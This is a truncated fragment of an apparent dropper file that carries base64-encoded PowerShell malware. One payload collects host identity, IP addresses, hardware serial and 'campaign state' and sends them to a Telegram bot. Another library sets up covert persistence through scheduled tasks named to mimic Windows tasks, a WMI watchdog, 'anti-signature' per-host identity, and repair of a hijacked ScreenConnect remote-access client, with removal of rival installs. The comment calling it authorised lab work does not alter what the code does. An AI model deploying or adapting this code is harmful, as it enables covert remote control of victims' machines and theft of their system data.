bGUpLCAoRXNjICRleHRyYSkpKQp9CgokcHJpbUxpbmUgPSBHZXQtU3ZjTGluZSAkcHJpbQokYWx0
TGluZSA9IEdldC1TdmNMaW5lICRhbHQKJHByaW1PayA9ICRwcmltTGluZSAtbGlrZSAnUnVubmlu
ZyonCiRkZXBsb3lPayA9ICRwcmltT2sgLWFuZCAoJHRhc2tPayAtZ2UgMykgLWFuZCAkaGFzTW9u
CgokZW1vamlNYXAgPSBAewogICAgT0sgICAgICAgPSBbc3RyaW5nXShbY2hhcl0weDI3MDUpCiAg
ICBET1dOICAgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZyb21VdGYzMigweDFGNkE4KSkK
ICAgIFJFU1RPUkVEID0gKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY3RTIp
KQogICAgRkFJTCAgICAgPSBbc3RyaW5nXShbY2hhcl0weDI3NEMpCiAgICBGT1JDRSAgICA9IFtz
dHJpbmddKFtjaGFyXTB4MjZBMSkKICAgIERFUExPWSAgID0gKFtzdHJpbmddW2NoYXJdOjpDb252
ZXJ0RnJvbVV0ZjMyKDB4MUY2ODApKQogICAgSEIgICAgICAgPSAoW3N0cmluZ11bY2hhcl06OkNv
bnZlcnRGcm9tVXRmMzIoMHgxRjRFMSkpCn0KJGtleSA9ICRTdGF0ZS5Ub1VwcGVySW52YXJpYW50
KCkKJGVtb2ppID0gaWYgKCRlbW9qaU1hcC5Db250YWluc0tleSgka2V5KSkgeyAkZW1vamlNYXBb
JGtleV0gfSBlbHNlIHsgKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY0RjEp
KSB9CgokdGl0bGUgPSBzd2l0Y2ggKCRrZXkpIHsKICAgICdPSycgeyAnUHJpbWFyeSBoZWFsdGh5
JyB9CiAgICAnRE9XTicgeyAnUHJpbWFyeSBET1dOIC0gaGVhbGluZycgfQogICAgJ1JFU1RPUkVE
JyB7ICdQcmltYXJ5IFJFU1RPUkVEJyB9CiAgICAnRkFJTCcgeyAnSGVhbCBGQUlMRUQnIH0KICAg
ICdGT1JDRScgeyAnRm9yY2VkIHJlaW5zdGFsbCcgfQogICAgJ0RFUExPWScgeyBpZiAoJGRlcGxv
eU9rKSB7ICdGSVJTVCBERVBMT1kgT0snIH0gZWxzZSB7ICdGSVJTVCBERVBMT1kgLSBDSEVDSyBO
RUVERUQnIH0gfQogICAgJ0hCJyB7ICdob3VybHkgZGlnZXN0JyB9CiAgICBkZWZhdWx0IHsgIlN0
YXRlOiAkU3RhdGUiIH0KfQoKJHRyYW5zID0gaWYgKCRPbGRTdGF0ZSkgeyAiJE9sZFN0YXRlIC0+
ICRTdGF0ZSIgfSBlbHNlIHsgJFN0YXRlIH0KJHNjTGlzdCA9IEdldC1TY0luc3RhbGxzCiRybW1I
aXRzID0gR2V0LVJtbUhpdHMKaWYgKCRybW1IaXRzLkNvdW50IC1lcSAwKSB7IFt2b2lkXSRybW1I
aXRzLkFkZCgnLSAobm9uZSBkZXRlY3RlZCknKSB9CgokcHViID0gR2V0LVB1YmxpY0lwCiRsYW4g
PSBHZXQtTG9jYWxJcHMKJG5vdyA9IEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06
c3Mgenp6JwokdXB0aW1lID0gJ24vYScKdHJ5IHsKICAgICRib290ID0gKEdldC1DaW1JbnN0YW5j
ZSBXaW4zMl9PcGVyYXRpbmdTeXN0ZW0pLkxhc3RCb290VXBUaW1lCiAgICAkdXB0aW1lID0gJ3sw
OmRkfWQgezA6aGh9aCB7MDptbX1tJyAtZiAoKEdldC1EYXRlKSAtICRib290KQp9IGNhdGNoIHt9
CgojIGNhbXBhaWduIHN0YXRlIGZpbGUgKHdyaXR0ZW4gYnkgb3duX2xpYi5wczEgc3RhdGUgYWN0
aW9uKQokc3RhdGVMaW5lID0gJ24vYScKJHN0YXRlT2JqID0gJG51bGwKJHN0YXRlUGF0aDIgPSBK
b2luLVBhdGggJFdvcmtEaXIgJ3N0YXRlLmpzb24nCmlmIChUZXN0LVBhdGggJHN0YXRlUGF0aDIp
IHsKICAgICRyYXdTdGF0ZSA9IChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRlUGF0aDIg
LVJhdykuVHJpbSgpCiAgICB0cnkgewogICAgICAgICRzdGF0ZU9iaiA9ICRyYXdTdGF0ZSB8IENv
bnZlcnRGcm9tLUpzb24KICAgICAgICAkZm9yZWlnbkNzdiA9IGlmICgkc3RhdGVPYmouZm9yZWln
bikgeyAoJHN0YXRlT2JqLmZvcmVpZ24gLWpvaW4gJywnKSB9IGVsc2UgeyAnLScgfQogICAgICAg
ICRzdGF0ZUxpbmUgPSAicHJpbT0kKCRzdGF0ZU9iai5wcmltKSBhbHQ9JCgkc3RhdGVPYmouYWx0
KSBmb3JlaWduPVskZm9yZWlnbkNzdl0gdGFza3M9JCgkc3RhdGVPYmoudGFza3NPaykvJCgkc3Rh
dGVPYmoudGFza3NUb3RhbCkgd2Q9JCgkc3RhdGVPYmoud2F0Y2hkb2cpIGhlYWxzPSQoJHN0YXRl
T2JqLmluc3RhbGxDb3VudCkiCiAgICB9IGNhdGNoIHsgJHN0YXRlTGluZSA9ICRyYXdTdGF0ZSB9
Cn0KCiRkZXBsb3lCbG9jayA9ICcnCmlmICgka2V5IC1lcSAnREVQTE9ZJykgewogICAgJHZlcmRp
Y3QgPSBpZiAoJGRlcGxveU9rKSB7ICdERVBMT1lFRCAvIEhFQUxUSFknIH0gZWxzZSB7ICdERVBM
T1lFRCBCVVQgSU5DT01QTEVURScgfQogICAgJGZvcmVpZ24gPSBAKEdldC1DaGlsZEl0ZW0gLVBh
dGggIiR7ZW52OlByb2dyYW1GaWxlc31cU2NyZWVuQ29ubmVjdCBDbGllbnQqIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgLURpcmVjdG9yeSAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZSB8CiAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAt
bm90bWF0Y2ggKCI1ZjYwMTA1Nzk4NTJlNTA3fGY4NjFjODE0MGQ0NTM0Mjd8ezB9IiAtZiAoR2V0
LUdyeXhhS2VlcEZwKSkgfSkKICAgICRkaWFnTGluZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xs
ZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQogICAgJGJvb3RQYXRoID0gSm9pbi1QYXRoICRX
b3JrRGlyICdib290LmVycicKICAgIGlmIChUZXN0LVBhdGggJGJvb3RQYXRoKSB7CiAgICAgICAg
JGludGVyZXN0aW5nID0gQCgKICAgICAgICAgICAgJ21zaV8nLCAnZmV0Y2hfJywgJ3ByaW1hcnlf
JywgJ251a2VfJywgJ21zaV90b28nLCAnbXNpX2ZldGNoJywgJ21zaV9leGl0JywKICAgICAgICAg
ICAgJ21zaV91bmF2YWlsYWJsZScsICdzZWN1cmVfJywgJ2dvXycsICdleHRlcm1pbmF0ZV8nLCAn
aWRlbnRpdHlfJywKICAgICAgICAgICAgJ2NyZWF0ZV90YXNrJywgJ3ZlcmlmeV90YXNrJywgJ29y
cGhhbl8nLCAnc3RhbGVfJywgJ3Bvc3RpbnN0YWxsJywgJ2FsdF8nCiAgICAgICAgKQogICAgICAg
IEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkYm9vdFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgewogICAgICAgICAgICAgICAgJGxp
bmUgPSAkXwogICAgICAgICAgICAgICAgZm9yZWFjaCAoJHQgaW4gJGludGVyZXN0aW5nKSB7IGlm
ICgkbGluZSAtbGlrZSAiKiR0KiIpIHsgcmV0dXJuICR0cnVlIH0gfQogICAgICAgICAgICAgICAg
JGZhbHNlCiAgICAgICAgICAgIH0gfAogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1MYXN0IDI2
IHwKICAgICAgICAgICAgRm9yRWFjaC1PYmplY3QgeyBbdm9pZF0kZGlhZ0xpbmVzLkFkZCgoJy0g
PGNvZGU+ezB9PC9jb2RlPicgLWYgKEVzYyAoJF8gLXJlcGxhY2UgJ1teXHgyMC1ceDdFXScsICc/
JykpKSkgfQogICAgfQogICAgaWYgKCRkaWFnTGluZXMuQ291bnQgLWVxIDApIHsgW3ZvaWRdJGRp
YWdMaW5lcy5BZGQoJy0gKG5vIGluc3RhbGwvbnVrZSBtYXJrZXJzIGluIGJvb3QuZXJyKScpIH0K
ICAgICRkZXBsb3lCbG9jayA9IEAiCgo8Yj5EZXBsb3kgdmVyZGljdDwvYj4KLSBSZXN1bHQ6IDxi
PiQoRXNjICR2ZXJkaWN0KTwvYj4KLSBQcmltYXJ5IFJ1bm5pbmc6ICQoaWYgKCRwcmltT2spIHsg
J1lFUycgfSBlbHNlIHsgJ05PJyB9KQotIE1vbml0b3Igc2NyaXB0ICgud3VjYWNoZVxvd25fbW9u
LmNtZCk6ICQoaWYgKCRoYXNNb24pIHsgJ1lFUycgfSBlbHNlIHsgJ05PJyB9KQotIEJhY2t1cCBt
b24gKC5ldGxjYWNoZVxldGxfbW9uLmNtZCk6ICQoaWYgKCRoYXNFdGwpIHsgJ1lFUycgfSBlbHNl
IHsgJ05PJyB9KQotIFBlcnNpc3QgdGFza3MgT0s6ICR0YXNrT2sgLyAkKCRleHBlY3RlZFRhc2tz
LkNvdW50KSAoYmFkL21pc3Npbmc6ICR0YXNrQmFkKQotIE1TSSBjYWNoZTogJChFc2MgJG1zaVNp
emUpCi0gRm9yZWlnbiBTQyBmb2xkZXJzIGxlZnQ6ICQoJGZvcmVpZ24uQ291bnQpCi0gTm90ZTog
TGFzdFJlc3VsdCAyNjcwMTEgPSB0YXNrIG5vdCB5ZXQgcnVuIChub3JtYWwgcmlnaHQgYWZ0ZXIg
Y3JlYXRlKQoKPGI+RGVwbG95IGxvZyBtYXJrZXJzPC9iPgokKCRkaWFnTGluZXMgLWpvaW4gImBu
IikKIkAKfQoKJHRleHQgPSBAIgokZW1vamkgPGI+U0MgTW9uaXRvciAtICQoRXNjICR0aXRsZSk8
L2I+Cgo8Yj5FdmVudDwvYj4KLSBTdW1tYXJ5OiAkKEVzYyAkU3VtbWFyeSkKLSBUcmFuc2l0aW9u
OiA8Y29kZT4kKEVzYyAkdHJhbnMpPC9jb2RlPgotIFdoZW46ICQoRXNjICRub3cpCi0gU291cmNl
IGJ1aWxkOiA8Y29kZT4kKEVzYyAkQnVpbGQpPC9jb2RlPgokZGVwbG95QmxvY2sKCjxiPkhvc3Q8
L2I+Ci0gQ29tcHV0ZXI6IDxjb2RlPiQoRXNjICRlbnY6Q09NUFVURVJOQU1FKTwvY29kZT4KLSBV
c2VyOiA8Y29kZT4kKEVzYyAkd2hvKTwvY29kZT4KLSBFbGV2YXRlZDogJGVsZXYgfCBTWVNURU06
ICRpc1N5c3RlbQotIERvbWFpbi9Xb3JrZ3JvdXA6ICQoRXNjICRvcy5Eb21haW4pCgo8Yj5OZXR3
b3JrPC9iPgotIExBTiBJUHM6IDxjb2RlPiQoRXNjICRsYW4pPC9jb2RlPgotIFB1YmxpYyBJUDog
PGNvZGU+JChFc2MgJHB1Yik8L2NvZGU+Cgo8Yj5PUyAvIEhhcmR3YXJlPC9iPgotIE9TOiAkKEVz
YyAkb3MuQ2FwdGlvbikKLSBWZXJzaW9uOiAkKEVzYyAkb3MuVmVyc2lvbikgKGJ1aWxkICQoRXNj
ICRvcy5CdWlsZCkpICQoRXNjICRvcy5BcmNoKQotIEluc3RhbGw6ICQoRXNjICRvcy5JbnN0YWxs
RGF0ZSkgfCBMYXN0IGJvb3Q6ICQoRXNjICRvcy5MYXN0Qm9vdCkKLSBVcHRpbWU6ICQoRXNjICR1
cHRpbWUpCi0gQ1BVOiAkKEVzYyAkb3MuQ1BVKQotIEhhcmR3YXJlOiAkKEVzYyAkb3MuTWFudWZh
Y3R1cmVyKSAkKEVzYyAkb3MuTW9kZWwpCi0gU2VyaWFsOiA8Y29kZT4kKEVzYyAkb3MuU2VyaWFs
KTwvY29kZT4KLSBSQU06ICQoJG9zLlRvdGFsUkFNX0dCKSBHQgotIERpc2sgQzogJCgkb3MuRGlz
a0ZyZWVfR0IpIEdCIGZyZWUgLyAkKCRvcy5EaXNrU2l6ZV9HQikgR0IKCjxiPlNjcmVlbkNvbm5l
Y3QgKGFsbCk8L2I+Ci0gU2V2cnogPGNvZGU+NWY2MDEwNTc5ODUyZTUwNzwvY29kZT46ICQoRXNj
ICRwcmltTGluZSkKLSBBbHQgPGNvZGU+Zjg2MWM4MTQwZDQ1MzQyNzwvY29kZT46ICQoRXNjICRh
bHRMaW5lKQotIEdyeXhhIDxjb2RlPiQoRXNjIChHZXQtR3J5eGFLZWVwRnApKTwvY29kZT46ICQo
RXNjIChHZXQtU3ZjTGluZSAoIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICh7MH0pIiAtZiAoR2V0LUdy
eXhhS2VlcEZwKSkpKQokKCRzY0xpc3QgLWpvaW4gImBuIikKCjxiPk90aGVyIFJNTSAvIHJlbW90
ZSB0b29sczwvYj4KJCgkcm1tSGl0cyAtam9pbiAiYG4iKQoKPGI+UGVyc2lzdCB0YXNrcyAoZXhw
ZWN0ZWQpPC9iPgokKCR0YXNrTGluZXMgLWpvaW4gImBuIikKCjxiPkNhY2hlPC9iPgotIE1TSSBj
YWNoZTogJChFc2MgJG1zaVNpemUpCi0gV29ya0RpcjogPGNvZGU+JChFc2MgJFdvcmtEaXIpPC9j
b2RlPgoKPGI+UGF5bG9hZCBidWlsZHMgKGluc3RhbGxlZCBvbiB0aGlzIGhvc3QpPC9iPgotIDxj
b2RlPk1PTj0kYk1vbiB8IFNFQz0kYlNlYyB8IFRHUj0kYlRnciB8IExJQj0kYkxpYjwvY29kZT4K
CjxiPkNhbXBhaWduIHN0YXRlPC9iPgotIDxjb2RlPiQoRXNjICRzdGF0ZUxpbmUpPC9jb2RlPgoK
PGk+Qm90OiBAbm9idWRkeXJtbUJvdCB8IFRHX1JFUE9SVCAkYlRncjwvaT4KIkAKCiMgY29tcGFj
dCBkaWdlc3QgbW9kZTogb25lIHNob3J0IGxpbmUsIEhUTUwtZnJlZSAoaG91cmx5IGhlYXJ0YmVh
dCkKaWYgKCRNb2RlIC1lcSAnY29tcGFjdCcpIHsKICAgICRmb3JlaWduTiA9IDAKICAgIGlmICgk
c3RhdGVPYmogLWFuZCAkc3RhdGVPYmouZm9yZWlnbikgeyAkZm9yZWlnbk4gPSBAKCRzdGF0ZU9i
ai5mb3JlaWduKS5Db3VudCB9CiAgICAkbXNpU2hvcnQgPSBpZiAoVGVzdC1QYXRoICRtc2lDYWNo
ZSkgeyAnezA6TjB9S0InIC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlIC1Gb3JjZSkuTGVuZ3RoIC8g
MUtCKSB9IGVsc2UgeyAnMCcgfQogICAgJHByaW1TaG9ydCA9IGlmICgkcHJpbU9rKSB7ICdPSycg
fSBlbHNlIHsgJ0RPV04nIH0KICAgICRhbHRTaG9ydCA9IGlmICgkYWx0TGluZSAtbGlrZSAnUnVu
bmluZyonKSB7ICdPSycgfSBlbHNlIHsgJy0nIH0KICAgICRncnl4YUxpbmUgPSBHZXQtU3ZjTGlu
ZSAoIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICh7MH0pIiAtZiAoR2V0LUdyeXhhS2VlcEZwKSkKICAg
ICRncnl4YVNob3J0ID0gaWYgKCRncnl4YUxpbmUgLWxpa2UgJ1J1bm5pbmcqJykgeyAnT0snIH0g
ZWxzZSB7ICctJyB9CiAgICAkdGV4dCA9ICIkZW1vamkgU0NEfCQoJGVudjpDT01QVVRFUk5BTUUp
fHNldj0kcHJpbVNob3J0fGdyeT0kZ3J5eGFTaG9ydHxhbHQ9JGFsdFNob3J0fGY9JGZvcmVpZ25O
fHQ9JHRhc2tPay81fGI9JEJ1aWxkIgp9CgppZiAoJHRleHQuTGVuZ3RoIC1ndCAzODAwKSB7CiAg
ICAkcm1tSGl0cyA9IEAoKCRybW1IaXRzIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMTIpKSArICgn
LSAuLi4gKHswfSBtb3JlKScgLWYgKCRybW1IaXRzLkNvdW50IC0gMTIpKQogICAgJHNjTGlzdCA9
IEAoKCRzY0xpc3QgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxNCkpICsgKCctIC4uLiAoezB9IG1v
cmUpJyAtZiAoJHNjTGlzdC5Db3VudCAtIDE0KSkKICAgICR0ZXh0ID0gJHRleHQuU3Vic3RyaW5n
KDAsIDM4MDApICsgImBuYG48aT5UUlVOQ0FURUQgKFRlbGVncmFtIDQwOTYgbGltaXQpPC9pPiIK
fQoKJGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInCmZ1bmN0aW9uIFNlbmQtVGco
W3N0cmluZ10kbXNnLCBbc3RyaW5nXSRtb2RlKSB7CiAgICAkcGF5bG9hZCA9IEB7CiAgICAgICAg
Y2hhdF9pZCAgICAgICAgICAgICAgICAgID0gJGNmZy5DSEFUX0lECiAgICAgICAgdGV4dCAgICAg
ICAgICAgICAgICAgICAgID0gJG1zZwogICAgICAgIGRpc2FibGVfd2ViX3BhZ2VfcHJldmlldyA9
ICR0cnVlCiAgICB9CiAgICBpZiAoJG1vZGUpIHsgJHBheWxvYWQucGFyc2VfbW9kZSA9ICRtb2Rl
IH0KICAgICRqc29uID0gJHBheWxvYWQgfCBDb252ZXJ0VG8tSnNvbiAtQ29tcHJlc3MgLURlcHRo
IDUKICAgICRieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGpz
b24pCiAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICgiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3Jn
L2JvdCQoJGNmZy5CT1RfVE9LRU4pL3NlbmRNZXNzYWdlIikgYAogICAgICAgIC1NZXRob2QgUG9z
dCAtQm9keSAkYnl0ZXMgLUNvbnRlbnRUeXBlICdhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0
Zi04JyB8IE91dC1OdWxsCn0KCmZ1bmN0aW9uIFNlbmQtVGdTYWZlKFtzdHJpbmddJG1zZywgW3N0
cmluZ10kbW9kZSkgewogICAgJHRvU2VuZCA9ICRtc2cKICAgIHRyeSB7CiAgICAgICAgU2VuZC1U
ZyAtbXNnICR0b1NlbmQgLW1vZGUgJG1vZGUKICAgICAgICByZXR1cm4gJHRydWUKICAgIH0gY2F0
Y2ggewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIFNlbmQtVGcgLW1zZyAoJHRvU2VuZC5TdWJz
dHJpbmcoMCwgMzAwMCkgKyAiYG48aT5UUlVOQ0FURUQ8L2k+IikgLW1vZGUgJG1vZGUKICAgICAg
ICAgICAgcmV0dXJuICR0cnVlCiAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgIHJldHVybiAk
ZmFsc2UKICAgICAgICB9CiAgICB9Cn0KCnRyeSB7CiAgICBpZiAoU2VuZC1UZ1NhZmUgLW1zZyAk
dGV4dCAtbW9kZSAnSFRNTCcpIHsKICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxv
ZyAtVmFsdWUgJ3RnX3NlbnRfcmljaCcgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAg
IH0gZWxzZSB7CiAgICAgICAgdGhyb3cgJ2h0bWxfZmFpbGVkJwogICAgfQogICAgaWYgKCRrZXkg
LWVxICdERVBMT1knKSB7CiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZh
bHVlICgidGdfZGVwbG95X29rPSIgKyAkZGVwbG95T2spIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
bnRpbnVlCiAgICAgICAgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoIChKb2luLVBhdGggJFdvcmtE
aXIgJ2RlcGxveV90Zy5mbGFnJykgLVZhbHVlIChHZXQtRGF0ZSAtRm9ybWF0ICdvJykgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIH0KfSBjYXRjaCB7CiAgICB0cnkgewogICAgICAg
ICRwbGFpbiA9IFtyZWdleF06OlJlcGxhY2UoJHRleHQsICc8W14+XSs+JywgJycpCiAgICAgICAg
JHBsYWluID0gW1N5c3RlbS5OZXQuV2ViVXRpbGl0eV06Okh0bWxEZWNvZGUoJHBsYWluKQogICAg
ICAgIGlmICgkcGxhaW4uTGVuZ3RoIC1ndCAzNTAwKSB7ICRwbGFpbiA9ICRwbGFpbi5TdWJzdHJp
bmcoMCwgMzUwMCkgKyAiYG5UUlVOQ0FURUQiIH0KICAgICAgICBTZW5kLVRnU2FmZSAtbXNnICRw
bGFpbiAtbW9kZSAnJyB8IE91dC1OdWxsCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRo
ICRsb2cgLVZhbHVlICd0Z19zZW50X3BsYWluJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZQogICAgfSBjYXRjaCB7CiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZh
bHVlICgidGdfZmFpbCAiICsgJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlCiAgICB9Cn0K
::B64_TGR_END
::B64_LIB_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAojIE9XTl9MSUIgIEJV
SUxEIDIwMjYwODAyTDE1CiMgU2hhcmVkIGxpYnJhcnk6IHBlci1ob3N0IGlkZW50aXR5IChhbnRp
LXNpZ25hdHVyZSksIFdNSSB3YXRjaGRvZwojIChtdXR1YWwgcGVyc2lzdGVuY2UgY2hhaW4pLCBj
YW1wYWlnbiBzdGF0ZSBmaWxlLCBTQyBzZXJ2aWNlIHJlcGFpci4KIyBMMTU6IGdyeXhhLWhlYWx0
aCAvIGdyeXhhLWVuc3VyZSDigJQgOGggZGVlcCBjaGVjayAoVENQK3JlbGF5K0ZQIGRyaWZ0IHJl
aW5zdGFsbCkuCiMgTDEzOiBzY2h0YXNrcyBDcmVhdGUgdmlhIGNtZCAobGlrZSBXdWNhY2hlT3du
KSwgVFIgdW5kZXIgV2luZG93c1xUZW1wXC53dWNhY2hlCiMgICAgICAobm90IEFDTC1sb2NrZWQg
UHJvZ3JhbURhdGEgcGF0aCksIC9TVCAwMDowMCBvbiBNSU5VVEUsIG5vIGxlYWRpbmcgXC4KIyBM
MTI6IElERU5UVkVSPTcgUk9PVC1sZXZlbCB0YXNrIG5hbWVzIChuZXN0ZWQgTWljcm9zb2Z0XFdp
bmRvd3MgQWNjZXNzIERlbmllZCkuCiMgTDExOiBORVZFUiByZXVzZSByZWFsIFdpbmRvd3MgYnVp
bHQtaW4gdGFzayBuYW1lczsgVFIgb3duZXJzaGlwIGNoZWNrcy4KIyBBdXRob3JpemVkIGludGVy
bmFsIGRlcGxveW1lbnQgLSBsYWIvY29tcGV0aXRpb24gc2NvcGUgb25seS4KIyDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZAKW0NtZGxldEJpbmRpbmcoKV0KcGFyYW0oCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9y
eSA9ICR0cnVlKV0KICAgIFtWYWxpZGF0ZVNldCgnaW5pdCcsICd3YXRjaGRvZycsICd3YXRjaGRv
Zy1lbnN1cmUnLCAndGFza3MtZW5zdXJlJywgJ3N0YXRlJywgJ2lkZW50aXR5JywgJ3JlcGFpcics
ICdyZWdpc3RlcmVkJywgJ2V4dGVybWluYXRlJywgJ2dyeXhhLWhlYWx0aCcsICdncnl4YS1lbnN1
cmUnKV0KICAgIFtzdHJpbmddJEFjdGlvbiwKICAgIFtzdHJpbmddJFdvcmtEaXIgPSAnQzpcUHJv
Z3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUnLAogICAgW3N0cmlu
Z10kTW9uUGF0aCA9ICcnLAogICAgW3N0cmluZ10kQnVpbGQgID0gJ08xNScsCiAgICBbc3RyaW5n
XSRFeHRyYSAgPSAnJywKICAgIFtzdHJpbmddJEZwICAgICA9ICcnLAogICAgW3N3aXRjaF0kRGVl
cCwKICAgIFtzd2l0Y2hdJEZvcmNlCikKCiRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAnU2lsZW50
bHlDb250aW51ZScKJGNmZ1BhdGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ2lkZW50aXR5LmNmZycK
JElkZW50VmVyc2lvbiA9IDgKCiMgUm9vdC1sZXZlbCBuYW1lcyBXSVRIT1VUIGxlYWRpbmcgYmFj
a3NsYXNoIChtYXRjaGVzIHdvcmtpbmcgV3VjYWNoZU93biBzdHlsZSkuCiRQb29scyA9IEB7CiAg
ICBBID0gQCgnV2VyUXVldWVTeW5jJywnRGlhZ0hvc3RDYWNoZScsJ05ldFRyYWNlQ2FjaGUnLCdX
ZGlIb3N0UHJveHknLCdQbGFTZXJ2ZXJIZWFsdGgnLCdUY3BJcENvbmZsaWN0UmVzJywnU3JDYWNo
ZVN5bmMnLCdSZXNvbHV0aW9uUXVldWUnKQogICAgQiA9IEAoJ1BsYVNlcnZlckhlYWx0aCcsJ1dk
aUhvc3RQcm94eScsJ1dlclF1ZXVlU3luYycsJ05ldFRyYWNlQ2FjaGUnLCdEaWFnSG9zdENhY2hl
JywnVGNwSXBDb25mbGljdFJlcycsJ1BsYVNlcnZlckRpYWcnLCdTckNhY2hlU3luYycpCiAgICBD
ID0gQCgnUmVzb2x1dGlvblF1ZXVlJywnTmV0VHJhY2VDYWNoZScsJ1RjcElwQ29uZmxpY3RSZXMn
LCdXZXJRdWV1ZVN5bmMnLCdQbGFTZXJ2ZXJIZWFsdGgnLCdEaWFnSG9zdENhY2hlJywnUGxhU2Vy
dmVyRGlhZycsJ1dkaUhvc3RQcm94eScpCiAgICBEID0gQCgnVGNwSXBDb25mbGljdFJlcycsJ1Jl
c29sdXRpb25RdWV1ZScsJ05ldFRyYWNlQ2FjaGUnLCdEaWFnSG9zdENhY2hlJywnUGxhU2VydmVy
RGlhZycsJ1dlclF1ZXVlU3luYycsJ1BsYVNlcnZlckhlYWx0aCcsJ1dkaUhvc3RQcm94eScpCn0K
JERlZmF1bHRzID0gW29yZGVyZWRdQHsKICAgIFRBU0tfQSA9ICdXZXJRdWV1ZVN5bmMnCiAgICBU
QVNLX0IgPSAnUGxhU2VydmVySGVhbHRoJwogICAgVEFTS19DID0gJ1dkaUhvc3RQcm94eScKICAg
IFRBU0tfRCA9ICdUY3BJcENvbmZsaWN0UmVzJwogICAgTU9fQSAgID0gJzInCiAgICBNT19CICAg
PSAnMycKfQoKZnVuY3Rpb24gR2V0LUhvc3RTZWVkIHsKICAgICRzID0gMEwKICAgIGZvcmVhY2gg
KCRjIGluICRlbnY6Q09NUFVURVJOQU1FLlRvVXBwZXIoKS5Ub0NoYXJBcnJheSgpKSB7ICRzID0g
KCRzICogMzEgKyBbaW50XSRjKSAlIDEwMDAwMDAwMDcgfQogICAgcmV0dXJuICRzCn0KCmZ1bmN0
aW9uIFJlYWQtSWRlbnRpdHkgewogICAgJGlkID0gJERlZmF1bHRzLkNsb25lKCkKICAgIGlmIChU
ZXN0LVBhdGggJGNmZ1BhdGgpIHsKICAgICAgICBmb3JlYWNoICgkbGluZSBpbiAoR2V0LUNvbnRl
bnQgLUxpdGVyYWxQYXRoICRjZmdQYXRoIC1Gb3JjZSkpIHsKICAgICAgICAgICAgaWYgKCRsaW5l
IC1tYXRjaCAnXlxzKihbQS1aX10rKVxzKj1ccyooLis/KVxzKiQnKSB7ICRpZFskbWF0Y2hlc1sx
XV0gPSAkbWF0Y2hlc1syXSB9CiAgICAgICAgfQogICAgfQogICAgcmV0dXJuICRpZAp9CgpmdW5j
dGlvbiBSZW1vdmUtVGFza1F1aWV0KFtzdHJpbmddJHRuKSB7CiAgICBpZiAoJHRuKSB7ICYgc2No
dGFza3MuZXhlIC9EZWxldGUgL1ROICR0biAvRiAyPiYxIHwgT3V0LU51bGwgfQp9CgpmdW5jdGlv
biBHZXQtVGFza1ZlcmJvc2VCbG9iKFtzdHJpbmddJHRuKSB7CiAgICBpZiAoLW5vdCAkdG4pIHsg
cmV0dXJuICcnIH0KICAgICRvdXQgPSAmIHNjaHRhc2tzLmV4ZSAvUXVlcnkgL1ROICR0biAvRk8g
